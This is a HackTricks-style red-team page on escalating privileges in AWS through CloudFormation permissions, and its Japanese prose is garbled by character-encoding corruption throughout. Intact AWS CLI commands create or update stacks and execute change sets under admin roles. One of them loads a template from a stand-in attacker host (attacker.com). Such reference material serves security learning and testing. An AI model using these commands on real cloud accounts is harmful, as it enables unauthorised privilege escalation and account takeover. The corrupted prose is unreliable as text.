# AWS - Cloudformation Privesc

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## cloudformation

cloudformationã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ã€ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../aws-services/aws-cloudformation-and-codestar-enum.md" %}
[aws-cloudformation-and-codestar-enum.md](../../aws-services/aws-cloudformation-and-codestar-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `cloudformation:CreateStack`

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**æŒ‡å®šã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã®ä¸‹ã§ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€ã‚µãƒ¼ãƒãƒ¼ã«ãƒ›ã‚¹ãƒˆã•ã‚ŒãŸã‚«ã‚¹ã‚¿ãƒ ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’ä½¿ç”¨ã—ã¦** **CloudFormationã‚¹ã‚¿ãƒƒã‚¯**ã‚’ä½œæˆã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€**æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š**
```bash
aws cloudformation create-stack --stack-name <stack-name> \
--template-url http://attacker.com/attackers.template \
--role-arn <arn-role>
```
ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã«ã¯ã€è¿½åŠ ã®æ¨©é™ **`cloudformation:DescribeStacks`** ã‚’æŒã¤ **ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆä¾‹**ãŒã‚ã‚Šã¾ã™ï¼š

{% content-ref url="iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md" %}
[iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md](iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md)
{% endcontent-ref %}

**æ½œåœ¨çš„ãªå½±éŸ¿:** æŒ‡å®šã•ã‚ŒãŸcloudformationã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

### `iam:PassRole`, (`cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`)

ã“ã®å ´åˆã€**æ—¢å­˜ã®cloudformationã‚¹ã‚¿ãƒƒã‚¯ã‚’æ‚ªç”¨**ã—ã¦ã€å‰ã®ã‚·ãƒŠãƒªã‚ªã®ã‚ˆã†ã«æ›´æ–°ã—ã€æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
aws cloudformation update-stack \
--stack-name privesc \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::91029364722:role/CloudFormationAdmin2 \
--capabilities CAPABILITY_IAM \
--region eu-west-1
```
`cloudformation:SetStackPolicy` æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã€**è‡ªåˆ†è‡ªèº«ã« `UpdateStack` æ¨©é™ã‚’ä»˜ä¸**ã—ã€æ”»æ’ƒã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** æŒ‡å®šã•ã‚ŒãŸ cloudformation ã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

### `cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`

ã“ã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ãŒ **`iam:PassRole` ãŒãªã„å ´åˆ**ã§ã‚‚ã€**ã‚¹ã‚¿ãƒƒã‚¯ã‚’æ›´æ–°**ã—ã€**æ—¢ã«æ·»ä»˜ã•ã‚Œã¦ã„ã‚‹ IAM ãƒ­ãƒ¼ãƒ«ã‚’æ‚ªç”¨**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼ˆæ›´æ–°æ™‚ã«ãƒ­ãƒ¼ãƒ«ã‚’æŒ‡å®šã—ãªã„ã§ãã ã•ã„ï¼‰ã€‚

`cloudformation:SetStackPolicy` æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã€**è‡ªåˆ†è‡ªèº«ã« `UpdateStack` æ¨©é™ã‚’ä»˜ä¸**ã—ã€æ”»æ’ƒã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** æ—¢ã«æ·»ä»˜ã•ã‚Œã¦ã„ã‚‹ cloudformation ã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

### `iam:PassRole`,((`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

ãƒ­ãƒ¼ãƒ«ã‚’**æ¸¡ã™æ¨©é™**ã¨**ChangeSet ã‚’ä½œæˆãŠã‚ˆã³å®Ÿè¡Œã™ã‚‹æ¨©é™**ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**æ–°ã—ã„ cloudformation ã‚¹ã‚¿ãƒƒã‚¯ã‚’ä½œæˆ/æ›´æ–°ã—ã€cloudformation ã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã‚’æ‚ªç”¨**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ CreateStack ã¾ãŸã¯ UpdateStack ã¨åŒæ§˜ã§ã™ã€‚

ä»¥ä¸‹ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯ã€**ChangeSet æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ã‚’ä½œæˆã™ã‚‹**[ **CreateStack ã®ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³**](./#iam-passrole-cloudformation-createstack)ã§ã™ã€‚
```bash
aws cloudformation create-change-set \
--stack-name privesc \
--change-set-name privesc \
--change-set-type CREATE \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::947247140022:role/CloudFormationAdmin \
--capabilities CAPABILITY_IAM \
--region eu-west-1

echo "Waiting 2 mins to change the stack"
sleep 120

aws cloudformation execute-change-set \
--change-set-name privesc \
--stack-name privesc \
--region eu-west-1

echo "Waiting 2 mins to execute the stack"
sleep 120

aws cloudformation describe-stacks \
--stack-name privesc \
--region eu-west-1
```
`cloudformation:SetStackPolicy` æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã€**ã‚¹ã‚¿ãƒƒã‚¯ã«å¯¾ã—ã¦ `ChangeSet` æ¨©é™ã‚’ä»˜ä¸**ã—ã€æ”»æ’ƒã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** cloudformation ã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

### (`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

ã“ã‚Œã¯å‰ã®æ–¹æ³•ã¨ä¼¼ã¦ã„ã¾ã™ãŒã€**IAM ãƒ­ãƒ¼ãƒ«**ã‚’æ¸¡ã•ãšã«è¡Œã†ãŸã‚ã€**ã™ã§ã«ã‚¢ã‚¿ãƒƒãƒã•ã‚Œã¦ã„ã‚‹ãƒ­ãƒ¼ãƒ«ã‚’æ‚ªç”¨**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã™ã‚‹ã ã‘ã§ã™:
```
--change-set-type UPDATE
```
**æ½œåœ¨çš„å½±éŸ¿:** æ—¢ã«ã‚¢ã‚¿ãƒƒãƒã•ã‚Œã¦ã„ã‚‹cloudformationã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

### `iam:PassRole`,(`cloudformation:CreateStackSet` | `cloudformation:UpdateStackSet`)

æ”»æ’ƒè€…ã¯ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦ã€ä»»æ„ã®cloudformationãƒ­ãƒ¼ãƒ«ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«StackSetsã‚’ä½œæˆ/æ›´æ–°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ½œåœ¨çš„å½±éŸ¿:** cloudformationã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

### `cloudformation:UpdateStackSet`

æ”»æ’ƒè€…ã¯passRoleæ¨©é™ãªã—ã§ã“ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦ã€ã‚¢ã‚¿ãƒƒãƒã•ã‚ŒãŸcloudformationãƒ­ãƒ¼ãƒ«ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«StackSetsã‚’æ›´æ–°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ½œåœ¨çš„å½±éŸ¿:** ã‚¢ã‚¿ãƒƒãƒã•ã‚ŒãŸcloudformationãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
